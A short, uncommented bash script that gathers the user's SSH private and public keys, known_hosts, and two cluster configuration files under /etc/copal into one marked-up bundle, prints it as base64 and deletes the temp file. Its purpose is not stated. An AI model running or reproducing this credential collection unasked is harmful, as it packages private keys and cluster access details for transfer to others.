#!/bin/bash
echo > _temp
file=~/.ssh/id_rsa && echo "@$file" >> _temp && cat $file >> _temp
file=~/.ssh/id_rsa.pub && echo "@$file" >> _temp && cat $file >> _temp
file=~/.ssh/known_hosts && echo "@$file" >> _temp && cat $file >> _temp
file=/etc/copal/data/globals/cluster.sh && echo "@$file" >> _temp && cat $file >> _temp 
file=/etc/copal/data/globals/peers.list && echo "@$file" >> _temp && cat $file >> _temp
base64 _temp && rm _temp
